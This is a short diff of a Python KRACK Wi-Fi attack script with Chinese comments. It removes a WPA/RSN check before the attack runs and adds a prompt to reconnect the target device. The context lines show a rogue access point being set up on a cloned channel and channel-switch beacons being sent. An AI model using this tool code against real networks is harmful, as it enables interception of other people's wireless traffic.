@@ -30,11 +30,7 @@ class NetworkConfig():
         self.wmmenabled = 0
         self.capab = 0
         self.hw = 'g'
-        
-    # 檢查 beacon frame MAC層是否包含RSNE訊息，沒有就代表非使用RSN網路(為WEP)
-    def is_wparsn(self):
-        return not self.group_cipher is None and self.wpavers > 0 and \
-            len(self.pairwise_ciphers) > 0 and len(self.akms) > 0
+
 
     def find_rogue_channel(self):
         self.rogue_channel = 1 if self.real_channel >= 6 else 8
@@ -546,10 +542,7 @@ class KRAckAttack():
         # 將 wifi ap 的 beacon 訊息紀錄，用來產生 hostapd.conf
         self.netconfig = NetworkConfig()
         self.netconfig.from_beacon(self.beacon)
-        if not self.netconfig.is_wparsn():
-            log(ERROR, "裝置目前連接的網路，使用 WEP 協議。")
-            return
-        elif self.netconfig.real_channel > 13:
+        if self.netconfig.real_channel > 13:
             self.netconfig.hw = 'a'
             log(WARNING, "偵測到裝置目前連接之網路為 5G 網路，請確保所使用的 rouge_ap 網卡為支援 5G 網路之網卡。")
         self.netconfig.find_rogue_channel()
@@ -586,6 +579,7 @@ class KRAckAttack():
         self.send_csa_beacon(numbeacons=4)
         subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
         
+        log(STATUS, "切換頻道完成，請重新開啟裝置Wi-Fi。")
         time.sleep(30)
 
         # Continue attack by monitoring both channels and performing needed actions
